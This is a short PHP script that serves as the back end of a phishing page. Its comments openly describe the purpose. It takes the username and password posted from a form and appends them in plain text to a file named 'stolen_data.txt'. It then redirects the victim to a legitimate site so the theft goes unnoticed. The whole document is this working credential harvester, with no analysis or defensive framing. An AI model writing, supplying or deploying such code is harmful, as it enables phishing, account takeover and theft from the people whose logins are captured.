<?php
// Capture form data
$username = $_POST['username'];
$password = $_POST['password'];

// Save data to a file or send it via email
file_put_contents('stolen_data.txt', "Username: $username, Password: $password\n", FILE_APPEND);

// Redirect the victim to the legitimate site
header('Location: https://legitimate-site.com');
exit;
?>